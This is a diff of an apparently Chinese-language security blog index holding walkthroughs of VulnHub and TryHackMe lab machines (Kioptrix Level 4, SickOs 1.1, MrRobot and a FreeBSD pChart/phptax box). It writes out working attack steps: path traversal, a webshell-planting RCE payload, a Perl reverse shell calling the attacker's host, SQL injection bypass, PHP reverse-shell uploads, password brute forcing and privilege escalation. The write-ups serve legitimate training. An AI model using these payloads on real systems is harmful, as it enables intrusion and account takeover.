-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p- 192.168.186.152</span><br></pre></td></tr></table></figure>
-
-<p>发现开放 80，8080 端口</p>
-<p><img src="/picture/image-20250414134537101.png" alt="image-20250414134537101"></p>
-<p>对开放的端口进行应用版本发现</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 80，8080 -A 192.168.186.152</span><br></pre></td></tr></table></figure>
-
-<p>80 和 8080 端口开放的服务版本是一样的，但是 8080 端口状态码是 403 Forbidden</p>
-<p><img src="/picture/image-20250414134749796.png" alt="image-20250414134749796"></p>
-<p>那先来看 80 端口，或许能从中找到为什么 8080 端口是 403 状态码</p>
-<p>进行目录扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.186.152</span><br></pre></td></tr></table></figure>
-
-<p>看起来没有发现什么有用的东西</p>
-<p><img src="/picture/image-20250414135036362.png" alt="image-20250414135036362"></p>
-<p>那就直接访问页面，在源码中发现新的目录 &#x2F;pChart2.1.3&#x2F;index.php</p>
-<p><img src="/picture/image-20250414135131213.png" alt="image-20250414135131213"></p>
-<p>访问一下看看，发现被重定向到 &#x2F;pChart2.1.3&#x2F;examples&#x2F;index.php ，看起来 &#x2F;pChart2.1.3 是网站真正的目录，同时也暴露了该架构的版本为 2.1.3 </p>
-<p><img src="/picture/image-20250414135234747.png" alt="image-20250414135234747"></p>
-<p>去搜索一下对应版本是否存在漏洞，在 <a href="https://www.exploit-db.com/exploits/31173">pChart 2.1.3 - Multiple Vulnerabilities - PHP webapps Exploit</a> 中可以发现存在路径遍历漏洞</p>
-<p><img src="/picture/image-20250414135622413.png" alt="image-20250414135622413"></p>
-<p>利用成功，回显 &#x2F;etc&#x2F;passwd ，同时泄露操作系统版本</p>
-<p><img src="/picture/image-20250414140103044.png" alt="image-20250414140103044"></p>
-<p>由于是 Apache 作为 WEB 服务器，那我们可以尝试使用默认路径读取 FreeBSD 的 Apache 配置文件</p>
-<p><img src="/picture/image-20250414140253529.png" alt="image-20250414140253529"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.186.152/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f../usr/local/etc/apache22/httpd.conf</span><br></pre></td></tr></table></figure>
-
-<p>包含成功，发现要访问 8080 需要特定的 User-Agent</p>
-<p><img src="/picture/image-20250414140356111.png" alt="image-20250414140356111"></p>
-<p>开启 burp 拦截，将 User-Agent 更改为 Mozilla&#x2F;4.0 ，发现 phptax 目录</p>
-<p><img src="/picture/image-20250414150134654.png" alt="image-20250414150134654"></p>
-<p>搜索 phptax 有关漏洞</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit phptax</span><br></pre></td></tr></table></figure>
-
-<p>发现三个有关 payload</p>
-<p><img src="/picture/image-20250414175813001.png" alt="image-20250414175813001"></p>
-<p>在 中能发现漏洞利用过程，先使用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;$url&#125;/index.php?field=rce.php&amp;newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E</span><br></pre></td></tr></table></figure>
-
-<p>在目标主机 &#x2F;tmp 目录创建 rce.php ，之后使用 cmd 参数命令执行</p>
-<p><img src="/picture/image-20250414175930362.png" alt="image-20250414175930362"></p>
-<p>利用成功</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.186.152:8080/phptax/data/rce.php?cmd=id</span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250414183044909.png" alt="image-20250414183044909"></p>
-<p>尝试反弹 shell </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.186.152:8080/phptax/data/rce.php?cmd=perl -MIO -e &#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;192.168.186.141:8023&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>成功获得回弹的 shell</p>
-<p><img src="/picture/image-20250414180217399.png" alt="image-20250414180217399"></p>
-<p>由于目标主机不包含 python ，不能升级 TTY shell</p>
-<p>查看内核版本发现是 FreeBSD 9.0 ，存在内核提权漏洞</p>
-<p><img src="/picture/image-20250414180438132.png" alt="image-20250414180438132"></p>
-<p>将 exp 下载至本机，由于目标主机没有 wget 命令，但是有 nc 命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">which nc</span><br><span class="line">/usr/bin/nc</span><br></pre></td></tr></table></figure>
-
-<p> 使用 nc 传输文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 本机</span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nc -nvlp 8888 &lt; 28718.c  </span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line">connect to [192.168.186.141] from (UNKNOWN) [192.168.186.152] 41152</span><br><span class="line"></span><br><span class="line"># 目标主机</span><br><span class="line">nc -nv 192.168.186.141 8888 &gt; 28718.c</span><br><span class="line"></span><br><span class="line">ls -la</span><br><span class="line">total 128</span><br><span class="line">drwxrwxrwx   9 www  wheel    512 Apr 14 06:10 .</span><br><span class="line">drwxrwxrwx   8 www  wheel    512 Mar 28  2014 ..</span><br><span class="line">drwxrwxrwx  12 www  wheel    512 May  7  2003 1040</span><br><span class="line">-rw-r--r--   1 www  wheel   5563 Apr 14 06:09 28718.c</span><br><span class="line">drwxrwxrwx   2 www  wheel    512 May  7  2003 SchA</span><br><span class="line">drwxrwxrwx   2 www  wheel    512 May  7  2003 SchB</span><br><span class="line">drwxrwxrwx   6 www  wheel    512 May  7  2003 SchD</span><br><span class="line">drwxrwxrwx   4 www  wheel    512 May  7  2003 SchD1</span><br><span class="line">drwxrwxrwx   7 www  wheel    512 May  7  2003 W2</span><br><span class="line">drwxrwxrwx   2 www  wheel   1536 Mar 26  2014 pdf</span><br><span class="line">-rw-r--r--   1 www  wheel     29 Apr 14 05:34 rce.php</span><br><span class="line">-rw-r--r--   1 www  wheel     29 Apr 14 05:45 shell.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250414182258978.png" alt="image-20250414182258978"></p>
-<p>使用目标主机自带 gcc 编译并赋予可执行权限，执行获得 root 权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc gcc 28718.c -o exp</span><br><span class="line">chmod +x exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250414181411716.png" alt="image-20250414181411716"></p>
-<p>获得 flag</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -la /root</span><br><span class="line">cat /root/congrats.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250414181815671.png" alt="image-20250414181815671"></p>
-]]></content>
-      <categories>
-        <category>Penetration Testing</category>
-      </categories>
-      <tags>
-        <tag>Penetration Testing</tag>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>My CMSMS Walkthrough</title>
     <url>/2025/03/19/MyCMSMS/</url>
     <content><![CDATA[<h1 id="My-CMSMS-Walkthrough"><a href="#My-CMSMS-Walkthrough" class="headerlink" title="My CMSMS Walkthrough"></a>My CMSMS Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/my-cmsms-1,498/">My CMSMS: 1</a></p>
@@ -1083,196 +974,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Kioptrix Level 4 Walkthrough</title>
-    <url>/2025/04/12/Kioptrix%20Level%204/</url>
-    <content><![CDATA[<h1 id="Kioptrix-Level-4-Walkthrough"><a href="#Kioptrix-Level-4-Walkthrough" class="headerlink" title="Kioptrix Level 4 Walkthrough"></a>Kioptrix Level 4 Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/kioptrix-level-13-4,25/">Kioptrix: Level 1.3 (#4)</a></p>
-<p><img src="/picture/image-20250412171255979.png" alt="image-20250412171255979"></p>
-<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>确定存活的主机</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.186.0/24</span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250412152621986.png" alt="image-20250412152621986"></p>
-<p>对目标 IP 进行端口发现</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p- 192.168.186.151</span><br></pre></td></tr></table></figure>
-
-<p>发现开放 22，80，139，445 端口</p>
-<p><img src="/picture/image-20250412152646226.png" alt="image-20250412152646226"></p>
-<p>对开放的端口进行应用版本发现</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 22,80,139,445 -A 192.168.186.151</span><br></pre></td></tr></table></figure>
-
-<p>22 端口开放 SSH 服务，80 端口开放 HTTP 服务，139 和 445 都是 SMB 服务</p>
-<p><img src="/picture/image-20250412152726245.png" alt="image-20250412152726245"></p>
-<p>先来看 22 端口 SSH 服务，看看对应版本有无可直接利用的漏洞</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit openssh 4.7</span><br></pre></td></tr></table></figure>
-
-<p>暂时没有发现什么可利用的漏洞</p>
-<p><img src="/picture/image-20250411101243184-1744442900987-9.png" alt="image-20250411101243184"></p>
-<p>再来看 80 端口，进行目录扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.186.150</span><br></pre></td></tr></table></figure>
-
-<p>发现可疑目录</p>
-<p><img src="/picture/image-20250412152915346.png" alt="image-20250412152915346"></p>
-<p>&#x2F;images 目录下有张 cartoon_goat.png 图片</p>
-<p><img src="/picture/image-20250412153228089.png" alt="image-20250412153228089"></p>
-<p>将其保存至本机，看看图片是否泄露信息</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings cartoon_goat.png</span><br></pre></td></tr></table></figure>
-
-<p>可惜没有</p>
-<p><img src="/picture/image-20250412153119443.png" alt="image-20250412153119443"></p>
-<p>直接访问 80 端口，发现是登陆页面，源码也没泄露关键信息</p>
-<p><img src="/picture/image-20250412153336276.png" alt="image-20250412153336276"></p>
-<p>尝试弱口令登陆，发现登陆失败则会 302 重定向至 &#x2F;checklogin.php</p>
-<p><img src="/picture/image-20250412153520258.png" alt="image-20250412153520258"></p>
-<p>最后来看 &#x2F;database.sql ，发现是将 john&#x2F;1234 插入 member 的 table 中，泄露账户和密码</p>
-<p><img src="/picture/image-20250412153636173.png" alt="image-20250412153636173"></p>
-<p>尝试使用 john&#x2F;1234 登陆 ssh </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -o HostKeyAlgorithms=+ssh-rsa john@192.168.186.151</span><br></pre></td></tr></table></figure>
-
-<p>登陆失败</p>
-<p><img src="/picture/image-20250412153827171.png" alt="image-20250412153827171"></p>
-<p>登陆后台，也失败</p>
-<p><img src="/picture/image-20250412153932406.png" alt="image-20250412153932406"></p>
-<p>既然都有数据库，那是否存在 SQL 注入呢？经过探查发现，在 mypassword 处发现单引号字符型注入</p>
-<p><img src="/picture/image-20250412154217894.png" alt="image-20250412154217894"></p>
-<p>试试看万能密码？由于是 post 型，所以要将注释符更改为 %23 (#)</p>
-<p><img src="/picture/image-20250412154551345.png" alt="image-20250412154551345"></p>
-<p>登陆成功，获得 john 真正的密码</p>
-<p><img src="/picture/image-20250412154435322.png" alt="image-20250412154435322"></p>
-<blockquote>
-<p>或者可以执行如下命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 into outfile &#x27;/var/www/user.txt&#x27; #</span><br></pre></td></tr></table></figure>
-
-<p>获得用户和密码</p>
-<p><img src="/picture/image-20250412170847009.png" alt="image-20250412170847009"></p>
-<p>该方法局限性在于网站根目录不一定是 &#x2F;var&#x2F;www</p>
-</blockquote>
-<p>尝试使用 ssh 远程登陆</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -o HostKeyAlgorithms=+ssh-rsa john@192.168.186.151</span><br></pre></td></tr></table></figure>
-
-<p>登陆成功，但似乎是在一个受限的环境中</p>
-<p><img src="/picture/image-20250412154802099.png" alt="image-20250412154802099"></p>
-<p>在这种情况下，需要逃逸 restrict shell ，可以尝试使用如下命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh username@IP -t &quot;/bin/bash&quot; or &quot;/bin/sh&quot;</span><br><span class="line">ssh username@IP -t &quot;bash --noprofile&quot;</span><br><span class="line">ssh username@IP -t &quot;() &#123; :; &#125;; /bin/bash&quot;</span><br></pre></td></tr></table></figure>
-
-<p>都失败了…</p>
-<p>由于可以执行 echo ，尝试 <code>echo os.system(&quot;/bin/bash&quot;)</code> 逃逸，逃逸成功</p>
-<p><img src="/picture/image-20250412155308111.png" alt="image-20250412155308111"></p>
-<p>接下来是提权，先查看目标主机真实开放的端口，发现有 3306 端口</p>
-<p><img src="/picture/image-20250412161508849.png" alt="image-20250412161508849"></p>
-<p>同时能发现 MySQL 以 root 身份运行</p>
-<p><img src="/picture/image-20250412162025117.png" alt="image-20250412162025117"></p>
-<p>那就去 web 网站目录看看有没有泄露 MySQL 账户密码，在 checklogin.php 出找到 root 账户的密码为空</p>
-<p><img src="/picture/image-20250412162244952.png" alt="image-20250412162244952"></p>
-<p>登陆 MySQL 服务</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -h localhost -u root -p</span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250412162751992.png" alt="image-20250412162751992"></p>
-<p>在查看 mysql 数据库时发现存在 func 表</p>
-<p><img src="/picture/image-20250412163002390.png" alt="image-20250412163002390"></p>
-<p>且表中含有执行命令的函数</p>
-<p><img src="/picture/image-20250412163052071.png" alt="image-20250412163052071"></p>
-<p>将 john 加入 root 用户组</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sys_exec(&#x27;usermod -aG admin john&#x27;);</span><br></pre></td></tr></table></figure>
-
-<p>使用 sudo su 切换为 root 身份，密码为 MyNameIsJohn ，提权成功</p>
-<p><img src="/picture/image-20250412170346429.png" alt="image-20250412170346429"></p>
-<p>获得 flag</p>
-<p><img src="/picture/image-20250412170449450.png" alt="image-20250412170449450"></p>
-]]></content>
-      <categories>
-        <category>Penetration Testing</category>
-      </categories>
-      <tags>
-        <tag>Penetration Testing</tag>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SickOs 1.1 Walkthrough</title>
-    <url>/2025/04/15/SickOs%201/</url>
-    <content><![CDATA[<h1 id="SickOs-1-1-Walkthrough"><a href="#SickOs-1-1-Walkthrough" class="headerlink" title="SickOs 1.1 Walkthrough"></a>SickOs 1.1 Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/sickos-11,132/">SickOs: 1.1</a></p>
-<p><img src="/picture/image-20250415184842698.png" alt="image-20250415184842698"></p>
-<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>确定存活的主机</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.186.0/24</span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250415155934060.png" alt="image-20250415155934060"></p>
-<p>对目标 IP 进行端口发现</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p- 192.168.186.153</span><br></pre></td></tr></table></figure>
-
-<p>发现开放 22，3128 端口</p>
-<p><img src="/picture/image-20250415160011982.png" alt="image-20250415160011982"></p>
-<p>对开放的端口进行应用版本发现</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 22,3128 -A 192.168.186.153 </span><br></pre></td></tr></table></figure>
-
-<p>22 和 3128 端口都没有什么可以直接利用的漏洞，</p>
-<p><img src="/picture/image-20250415160104311.png" alt="image-20250415160104311"></p>
-<p>3128 端口是作为代理使用的，所以想访问 80 端口必须走 3128 端口代理，使用代理对 80 端口进行目录扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.186.153/ --proxy=http://192.168.186.153:3128/</span><br></pre></td></tr></table></figure>
-
-<p>发现 &#x2F;connect 和 &#x2F;robots.txt 目录</p>
-<p><img src="/picture/image-20250415160618029.png" alt="image-20250415160618029"></p>
-<p>开启 Firefox 全局代理，所有请求都要通过 3128 代理转发</p>
-<p><img src="/picture/image-20250415160839856.png" alt="image-20250415160839856"></p>
-<p>访问 80 端口主页面，没有泄露任何信息</p>
-<p><img src="/picture/image-20250415161045216.png" alt="image-20250415161045216"></p>
-<p>访问 connect 发现是谜语</p>
-<p><img src="/picture/image-20250415165355072.png" alt="image-20250415165355072"></p>
-<p>访问 robots.txt ，会发现除了 80 端口根目录外，还有 &#x2F;wolfcms 也是 Disallow 的</p>
-<p><img src="/picture/image-20250415161159986.png" alt="image-20250415161159986"></p>
-<p>访问，是 Wolf 的主目录</p>
-<p><img src="/picture/image-20250415165521729.png" alt="image-20250415165521729"></p>
-<p>对 WolfCMS 进行进一步扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.186.153/wolfcms --proxy=http://192.168.186.153:3128/</span><br></pre></td></tr></table></figure>
-
-<p>其中 20B 大小的内容是空的</p>
-<p><img src="/picture/image-20250415165848811.png" alt="image-20250415165848811"></p>
-<p>在 &#x2F;wolfcms&#x2F;docs&#x2F;updating.txt 文件中可以发现 Wolf CMS 版本更新至 0.8.2 </p>
-<p><img src="/picture/image-20250415170001718.png" alt="image-20250415170001718"></p>
-<p>0.8.2 后台存在文件上传漏洞，但需要登陆后台，幸运的是，弱口令直接试出来了，是 admin&#x2F;admin</p>
-<p><img src="/picture/image-20250415170207828.png" alt="image-20250415170207828"></p>
-<p>可以直接在 Files 处没有限制的上传文件，这里上传的是 kali 自带的更改 ip 和 port 后的 php-reverse-shell.php </p>
-<p>从标题中不难发现，上传至 public 目录</p>
-<p><img src="/picture/image-20250415170809740.png" alt="image-20250415170809740"></p>
-<p>成功上传</p>
-<p><img src="/picture/image-20250415170900207.png" alt="image-20250415170900207"></p>
-<p>kali 开启 nc 监听，点击访问 php 文件，即可接收到反弹回来的 shell ，并将其升级为 TTY shell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250415171146164.png" alt="image-20250415171146164"></p>
-<p>接下来是提权，通过 <code>netstat -tln</code> 发现目标主机运行了 3306 端口</p>
-<p><img src="/picture/image-20250415171908364.png" alt="image-20250415171908364"></p>
-<p>在 WolfCMS 的 config.php 中可以发现 MySQL 的账号和密码</p>
-<p><img src="/picture/image-20250415172057575.png" alt="image-20250415172057575"></p>
-<p>登陆目标主机 mysql 服务</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -h localhost -u root -p</span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250415172200514.png" alt="image-20250415172200514"></p>
-<p>可惜查看一圈并没有泄露信息，由于开放 SSH 服务，我们可以考虑尝试密码喷洒，那就要知道用户名，在 &#x2F;etc&#x2F;passwd 中找到已登录的用户名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@SickOs:/var/www$ cat /etc/passwd | grep bash</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash</span><br></pre></td></tr></table></figure>
-
-<p>用户名是 sickos ，尝试 SSH 远程登陆账户</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh sickos@192.168.186.153</span><br></pre></td></tr></table></figure>
-
-<p>成功登陆</p>
-<p><img src="/picture/image-20250415183135168.png" alt="image-20250415183135168"></p>
-<p>发现 sickos 可以使用 sudo 执行所有命令</p>
-<p><img src="/picture/image-20250415183317566.png" alt="image-20250415183317566"></p>
-<p>使用如下命令提权</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo sudo /bin/bash</span><br></pre></td></tr></table></figure>
-
-<p>提权成功</p>
-<p><img src="/picture/image-20250415183426600.png" alt="image-20250415183426600"></p>
-<p>获得 flag</p>
-<p><img src="/picture/image-20250415183518567.png" alt="image-20250415183518567"></p>
-]]></content>
-      <categories>
-        <category>Penetration Testing</category>
-      </categories>
-      <tags>
-        <tag>Penetration Testing</tag>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>PwnLab init Walkthrough</title>
     <url>/2025/04/16/PwnLab%20init/</url>
     <content><![CDATA[<h1 id="PwnLab-init-Walkthrough"><a href="#PwnLab-init-Walkthrough" class="headerlink" title="PwnLab: init Walkthrough"></a>PwnLab: init Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/pwnlab-init,158/">PwnLab: init</a></p>
@@ -1372,6 +1073,115 @@
       <tags>
         <tag>Penetration Testing</tag>
         <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MrRobot Walkthrough</title>
+    <url>/2025/04/07/MrRobot/</url>
+    <content><![CDATA[<h1 id="MrRobot-Walkthrough"><a href="#MrRobot-Walkthrough" class="headerlink" title="MrRobot Walkthrough"></a>MrRobot Walkthrough</h1><h2 id="box-info"><a href="#box-info" class="headerlink" title="box info"></a>box info</h2><p>靶机地址：<a href="https://tryhackme.com/room/mrrobot">Mr Robot CTF</a></p>
+<p>This is a virtual machine meant for beginners&#x2F;intermediate users. There are 3 hidden keys located on the machine, can you find them?</p>
+<p><img src="/picture/image-20250317180740734.png" alt="image-20250317180740734"></p>
+<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- -Pn 10.10.173.41</span><br></pre></td></tr></table></figure>
+
+<p>发现开放的 80 和 443 端口</p>
+<p><img src="/picture/image-20250317174827626.png" alt="image-20250317174827626"></p>
+<p>先来看 HTTP 和 HTTPS 服务，80 端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p80 -A -Pn 10.10.173.41</span><br></pre></td></tr></table></figure>
+
+<p>未扫描出 apache 版本，暂不考虑从 apache 版本漏洞下手</p>
+<p><img src="/picture/image-20250317175001101.png" alt="image-20250317175001101"></p>
+<p>443 端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p443 -A -Pn 10.10.173.41</span><br></pre></td></tr></table></figure>
+
+<p>也未扫描出 apache 版本</p>
+<p><img src="/picture/image-20250317175433693.png" alt="image-20250317175433693"></p>
+<p>对 HTTP 服务进行目录扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.10.173.41/ -w /usr/share/wordlists/dirb/big.txt</span><br></pre></td></tr></table></figure>
+
+<p>发现 robots.txt 同时还发现很多以 wp 开头的目录，猜测是 WordPress 构建的网站</p>
+<p><img src="/picture/image-20250317181555893.png" alt="image-20250317181555893"></p>
+<p>访问 robots.txt 发现第一个 key 同时发现隐藏目录 fsocity.dic </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">fsocity.dic</span><br><span class="line">key-1-of-3.txt</span><br></pre></td></tr></table></figure>
+
+<p>访问 &#x2F;key-1-of-3.txt 就能得到第一个 key </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">073403c8a58a1f80d943455fb30724b9</span><br></pre></td></tr></table></figure>
+
+<p>访问 fsocity.dic 能看到诸如 username、password 等字样，似乎是一个用户名和密码的字典</p>
+<p><img src="/picture/image-20250317182225086.png" alt="image-20250317182225086"></p>
+<p><img src="/picture/image-20250317182249643.png" alt="image-20250317182249643"></p>
+<p>将 fsocity.dic 下载至本地</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.173.41/fsocity.dic</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250317183249439.png" alt="image-20250317183249439"></p>
+<p>使用 ffuf 爆破后台密码：</p>
+<p>使用 burp 拦截，发现 username 和 password 以 POST 方式传输，同时 Cookie 不是动态刷新，也存在用户名枚举漏洞</p>
+<p><img src="/picture/image-20250317190217356.png" alt="image-20250317190217356"></p>
+<p>去除 fsocity.dic 中重复字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sort fsocity.dic | uniq &gt; fsocity_uniq.dic</span><br></pre></td></tr></table></figure>
+
+<p>将 request 保存为 request.txt ，使用 ffuf 爆破用户名（ fsocity_uniq.dic 字典较大，同时爆破用户名和密码要发送的数据过于巨大，大概千亿级 ）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -request request.txt -w fsocity_uniq.dic:USER -fr &quot;Invalid username.&quot;</span><br></pre></td></tr></table></figure>
+
+<p>发现三个用户名：</p>
+<p><img src="/picture/image-20250317202629081.png" alt="image-20250317202629081"></p>
+<p>继续爆破密码，先尝试 <code>Elliot</code> ：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -request request.txt -w fsocity.dic:PASS -fr &quot;is incorrect.&quot;</span><br></pre></td></tr></table></figure>
+
+<p>运气不错，密码为 <code>ER28-0652</code></p>
+<p><img src="/picture/image-20250317201924308.png" alt="image-20250317201924308"></p>
+<p>成功进入后台：</p>
+<p><img src="/picture/image-20250317202800128.png" alt="image-20250317202800128"></p>
+<p>将 php-reverse-shell.php 拷贝至工作目录，并更改 IP 和端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /usr/share/webshells/php/php-reverse-shell.php .</span><br><span class="line">vi php-reverse-shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250317203655296.png" alt="image-20250317203655296"></p>
+<p>再 plugins 的 add new 处上传</p>
+<p><img src="/picture/image-20250317203900422.png" alt="image-20250317203900422"></p>
+<p>再 Media 处就能看到上传到 php 文件及其所在地址：</p>
+<p><img src="/picture/image-20250317204004647.png" alt="image-20250317204004647"></p>
+<p><img src="/picture/image-20250317204154357.png" alt="image-20250317204154357"></p>
+<p>使用 nc 侦听 1234 端口，同时访问 PHP 所在网址</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nvlp 1234</span><br></pre></td></tr></table></figure>
+
+<p>成功 getshell ：</p>
+<p><img src="/picture/image-20250317204533213.png" alt="image-20250317204533213"></p>
+<p> 寻找 &#x2F;home 中用户的主目录，尝试寻找第二个 key</p>
+<p>最终在 &#x2F;home&#x2F;robot 目录中找到第二个 key ，只能 root 用户读取的 <code>key-2-of-3.txt</code> ，同时寻找到疑似 root 密码哈希</p>
+<p><img src="/picture/image-20250317205337671.png" alt="image-20250317205337671"></p>
+<p>使用 hashcat 的字典模式破解密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -a 0 -m 0 c3fcd3d76192e4007dfb496cca67e13b /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>密码为：<code>abcdefghijklmnopqrstuvwxyz</code></p>
+<p><img src="/picture/image-20250317210031810.png" alt="image-20250317210031810"></p>
+<p>直接登陆 robot 账户：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su robot</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250317210333682.png" alt="image-20250317210333682"></p>
+<p>获得 key 2 ：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">822c73956184f694993bede3eb39f959</span><br></pre></td></tr></table></figure>
+
+<p>接下来是提权，已知 robot 密码，确认是否有权通过 <code>sudo</code> 运行某些命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p>没有能执行 sudo 的命令</p>
+<p>查找具有 SUID 权限的文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">robot@linux:/$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/local/bin/nmap</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper</span><br><span class="line">/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper</span><br><span class="line">/usr/lib/pt_chown</span><br></pre></td></tr></table></figure>
+
